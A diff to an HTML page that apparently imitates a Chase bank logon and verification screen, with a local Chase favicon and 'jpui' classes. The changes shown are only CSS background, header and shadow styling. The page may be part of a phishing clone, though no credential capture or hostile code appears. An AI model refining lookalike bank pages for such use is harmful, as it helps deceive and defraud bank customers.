@@ -25,9 +25,17 @@
     <link rel="shortcut icon" href="./img/chasefavicon.ico">
     <script src="https://kit.fontawesome.com/21cf0ca2ce.js" crossorigin="anonymous"></script>
     <style>
+        body {
+            background-color: #ffffff !important;
+        }
+        .logon-header {
+            background-color: #117aca;
+            background-image: none;
+        }
         .verification-box {
             padding: 30px;
             margin-top: 50px;
+            background-color: #ffffff;
         }
         .step-header {
             font-size: 14px;
@@ -116,9 +124,19 @@
             font-size: 50px;
             margin-bottom: 20px;
         }
+        .logon-content {
+            background-color: #ffffff;
+        }
+        .logon-container {
+            background-color: #ffffff;
+            min-height: 100vh;
+        }
+        .jpui.raised.segment {
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
     </style>
 </head>
-<body class="less">
+<body style="background-color: #ffffff; overflow-x: hidden; overflow-y: auto;">
 
 <div id="overlay-spinner" class="overlay-spinner">
     <div class="spinner-content">
